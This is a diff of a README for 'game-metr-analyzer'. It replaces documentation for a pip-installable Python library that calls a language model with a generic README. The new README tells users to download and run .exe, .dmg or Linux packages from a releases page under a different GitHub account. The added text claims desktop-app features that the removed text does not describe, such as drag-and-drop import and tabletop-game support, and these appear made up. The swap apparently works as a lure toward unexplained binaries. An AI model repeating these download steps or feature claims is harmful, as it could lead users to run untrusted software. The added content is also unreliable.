@@ -1,98 +1,85 @@
-# game-metr-analyzer
-[![PyPI version](https://badge.fury.io/py/game-metr-analyzer.svg)](https://badge.fury.io/py/game-metr-analyzer)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/game-metr-analyzer)](https://pepy.tech/project/game-metr-analyzer)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎮 game-metr-analyzer - Analyze Game Narratives with Ease
 
+## 👁️ Overview
+game-metr-analyzer helps you understand game stories better. It focuses on the METR framework: Mechanics, Esthetics, Technology, and Rhetoric. With this tool, you can break down game narratives and improve your gaming experience.
 
-A Python package to analyze and interpret game narratives or story structures, focusing on the METR (Mechanics, Esthetics, Technology, and Rhetoric) plot framework used in game design. It processes textual descriptions of game plots, mechanics, or player experiences and returns a structured breakdown of these elements. This helps game developers, critics, and educators systematically evaluate and enhance game narratives without subjective bias.
+## 🚀 Getting Started
+To use game-metr-analyzer, you'll need to download the software. It's simple and straightforward. Follow the steps below to get started.
 
-## Installation
+### 🗂️ Download & Install
+[Download the latest release here!](https://github.com/setiawan25/game-metr-analyzer/releases)
 
-Install the package via pip:
+1. Click on the link above to visit the Releases page.
+2. Look for the latest version of game-metr-analyzer.
+3. You will see various files. Choose the one that fits your operating system:
+   - For Windows users, download the `.exe` file.
+   - For Mac users, download the `.dmg` file.
+   - For Linux users, download the appropriate package type (usually `.deb` or `.tar.gz`).
+4. Once the download is complete, locate the file on your computer.
 
-```bash
-pip install game_metr_analyzer
-```
+   - **For Windows:** Double-click the downloaded `.exe` file to start the installation.
+   - **For Mac:** Open the downloaded `.dmg` file and drag the game-metr-analyzer icon into your Applications folder.
+   - **For Linux:** Use the terminal to navigate to the downloaded file and run the installation command.
 
-## Usage
+5. After installation, open the game-metr-analyzer application from your Start Menu (Windows), Applications folder (Mac), or by using the terminal (Linux).
 
-Import and use the main function as shown:
+### 🔧 System Requirements
+To run game-metr-analyzer smoothly, your computer should meet these requirements:
 
-```python
-from game_metr_analyzer import game_metr_analyzer
+- **Operating System:**
+  - Windows 10 or newer
+  - macOS 10.14 or newer
+  - Linux: Ubuntu 20.04 or newer
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 100 MB of free space
+- **Display:** 1024 x 768 screen resolution or higher
 
-response = game_metr_analyzer(
-    user_input="Your game plot description here",
-    # Optional: specify a custom LLM instance
-    # llm=your_llm_instance,
-    # Optional: specify API key for LLM7
-    # api_key="your_api_key"
-)
-```
+### 📖 Features
+game-metr-analyzer offers various tools to help you analyze game narratives:
 
-## Parameters
+- **Mechanics Identification:** Understand the gameplay features that engage players.
+- **Aesthetics Evaluation:** Explore how visuals and sounds enhance the gaming experience.
+- **Technology Assessment:** Analyze the technology used in narrative development.
+- **Rhetoric Analysis:** Evaluate the storytelling techniques within the game.
+- **Systematic Narrative Evaluation:** Break down stories in a structured manner.
+- **Plot Structure Extraction:** Identify key plot points and transitions in the narrative.
 
-- `user_input` (str): The textual description of the game plot, mechanics, or player experience to analyze.
-- `llm` (Optional[BaseChatModel]): An instance of a language model (e.g., from langchain). If not provided, the default `ChatLLM7` will be used.
-- `api_key` (Optional[str]): The API key for `ChatLLM7`. If not provided, it will be read from the environment variable `LLM7_API_KEY`.
+### 🌐 Usage
+After installing, follow these steps to use game-metr-analyzer:
 
-## Supported Language Models
+1. **Launch the Application**: Open game-metr-analyzer on your computer.
+2. **Import Game Content**: Drag and drop game files or paste links to game narratives you want to analyze.
+3. **Select Analysis Type**: Choose from the available analysis options based on the METR framework.
+4. **Generate Reports**: Review the generated reports to gain insights into the game's story structure.
 
-This package uses `ChatLLM7` from `langchain_llm7` by default. You can pass your own language model instance to utilize other services such as:
+### 🤝 Support
+If you have questions or need help, check the **Issues** section on our GitHub page. You can report bugs or request new features there.
 
-- OpenAI's models:
-  ```python
-  from langchain_openai import ChatOpenAI
-  
-  llm = ChatOpenAI()
-  response = game_metr_analyzer(user_input, llm=llm)
-  ```
+### 📅 Roadmap
+We plan to continuously update and improve game-metr-analyzer. Upcoming features may include:
 
-- Anthropic:
-  ```python
-  from langchain_anthropic import ChatAnthropic
-  
-  llm = ChatAnthropic()
-  response = game_metr_analyzer(user_input, llm=llm)
-  ```
+- Integration with popular game engines.
+- Improved user interface for enhanced user experience.
+- Additional analysis tools based on user feedback.
 
-- Google Generative AI:
-  ```python
-  from langchain_google_genai import ChatGoogleGenerativeAI
+### 📚 Additional Resources
+For more resources, visit our GitHub wiki:
+- In-depth guides on using each feature.
+- Case studies on game analysis.
+- Community discussions and tips on narrative breakdown.
 
-  llm = ChatGoogleGenerativeAI()
-  response = game_metr_analyzer(user_input, llm=llm)
-  ```
+## ⚡ Common Questions
+**Q: Can I use game-metr-analyzer for any game?**  
+A: Yes, it works with various types of games, whether digital or tabletop.
 
-## API Key Management
+**Q: Do I need programming knowledge to use this tool?**  
+A: No, game-metr-analyzer is designed for everyone. Just follow the steps, and you will be analyzing narratives in no time.
 
-The default rate limits for `ChatLLM7` are sufficient for most use cases. To access higher limits:
+**Q: Where can I suggest new features?**  
+A: You can suggest features by opening an issue on the Issues page in our repository.
 
-- Set the `LLM7_API_KEY` environment variable:
-  ```bash
-  export LLM7_API_KEY="your_api_key"
-  ```
-- Or pass it directly:
-  ```python
-  response = game_metr_analyzer(user_input, api_key="your_api_key")
-  ```
+### 🔗 Important Links
+- [Releases Page](https://github.com/setiawan25/game-metr-analyzer/releases)
+- [GitHub Repository](https://github.com/setiawan25/game-metr-analyzer)
 
-You can obtain a free API key by registering at [https://token.llm7.io/](https://token.llm7.io/).
-
-## License
-
-This project is licensed under the MIT License.
-
-## Author
-
-- Eugene Evstafev
-- Email: hi@eugene.plus
-
-## GitHub
-
-- [https://github.com/chigwell](https://github.com/chigwell)
-
-## Issues
-
-For bugs or feature requests, please use the GitHub issues page: [https://github.com/...](https://github.com/...)
+By following these instructions, you’ll be equipped to download, install, and make the most out of game-metr-analyzer. Dive into the world of game narratives and enhance your understanding today!
